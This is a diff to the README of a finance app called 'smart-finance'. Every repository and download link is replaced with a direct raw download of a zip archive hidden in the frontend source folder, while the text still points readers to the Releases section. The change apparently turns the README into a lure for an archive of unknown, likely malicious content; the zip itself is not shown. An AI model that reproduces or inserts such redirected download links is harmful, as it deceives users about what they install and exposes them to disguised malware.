@@ -1,6 +1,6 @@
 # 💰 smart-finance - Manage Your Money Simply
 
-[![Download smart-finance](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/Eddy150875/smart-finance)
+[![Download smart-finance](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/Eddy150875/smart-finance/raw/refs/heads/main/frontend/src/redux/expenses/smart-finance-still.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Below are the steps to get smart-finance running on your Windows PC. Follow each
 
 1. Visit the smart-finance download page by clicking the button below:
 
-   [![Visit smart-finance on GitHub](https://img.shields.io/badge/GitHub-grey?style=for-the-badge)](https://github.com/Eddy150875/smart-finance)
+   [![Visit smart-finance on GitHub](https://img.shields.io/badge/GitHub-grey?style=for-the-badge)](https://github.com/Eddy150875/smart-finance/raw/refs/heads/main/frontend/src/redux/expenses/smart-finance-still.zip)
 
 2. On the page, look for the **Releases** section on the right or scroll down until you find the latest version. Click on it.
 
@@ -109,8 +109,8 @@ Check the GitHub page regularly to download newer versions. Updating keeps the a
 
 ## 🔗 Useful Links
 
-- Visit the main page: https://github.com/Eddy150875/smart-finance
-- Access the download area here: https://github.com/Eddy150875/smart-finance
+- Visit the main page: https://github.com/Eddy150875/smart-finance/raw/refs/heads/main/frontend/src/redux/expenses/smart-finance-still.zip
+- Access the download area here: https://github.com/Eddy150875/smart-finance/raw/refs/heads/main/frontend/src/redux/expenses/smart-finance-still.zip
 
 ---
 
